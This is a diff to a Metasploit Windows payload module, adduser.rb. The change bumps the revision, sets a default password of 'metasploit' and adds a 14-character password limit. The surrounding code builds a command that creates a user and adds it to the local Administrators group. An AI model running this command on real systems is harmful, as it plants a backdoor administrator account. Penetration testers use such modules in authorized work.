@@ -1,5 +1,5 @@
 ##
-# $Id: adduser.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: adduser.rb 7024 2009-09-10 03:29:51Z hdm $
 ##
 
 ##
@@ -26,7 +26,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'          => 'Windows Execute net user /ADD',
-			'Version'       => '$Revision: 6479 $',
+			'Version'       => '$Revision: 7024 $',
 			'Description'   => 'Create a new user and add them to local administration group',
 			'Author'        => 'hdm',
 			'License'       => MSF_LICENSE,
@@ -38,7 +38,7 @@ module Metasploit3
 		register_options(
 			[
 				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
-				OptString.new('PASS', [ true, "The password for this user", ""           ]),
+				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
 			], self.class)
 
 		# Hide the CMD option...this is kinda ugly
@@ -51,6 +51,10 @@ module Metasploit3
 	def command_string
 		user = datastore['USER'] || 'metasploit'
 		pass = datastore['PASS'] || ''
+		
+		if(pass.length > 14)
+			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
+		end	
 
 		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
 			"net localgroup Administrators #{user} /ADD"
